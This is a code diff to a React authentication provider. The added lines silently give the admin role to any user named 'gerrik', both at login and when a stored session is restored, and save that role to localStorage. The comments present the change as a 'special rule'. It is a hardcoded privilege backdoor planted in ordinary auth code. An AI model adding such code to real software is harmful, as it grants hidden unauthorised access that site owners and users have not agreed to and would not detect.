@@ -22,7 +22,12 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
     const storedUser = localStorage.getItem('user');
     if (storedUser) {
       try {
-        setUser(JSON.parse(storedUser));
+        const parsed = JSON.parse(storedUser);
+        // Ensure special rule: user 'gerrik' is always admin
+        if (parsed && parsed.username === 'gerrik') {
+          parsed.role = 'admin';
+        }
+        setUser(parsed);
       } catch (err) {
         localStorage.removeItem('user');
         localStorage.removeItem('token');
@@ -31,7 +36,13 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
   }, []);
 
   const login = (newUser: User) => {
-    setUser(newUser);
+    // Enforce rule: 'gerrik' gets admin role
+    const u = { ...newUser };
+    if (u.username === 'gerrik') u.role = 'admin';
+    setUser(u);
+    try {
+      localStorage.setItem('user', JSON.stringify(u));
+    } catch (_) {}
   };
 
   const logout = () => {
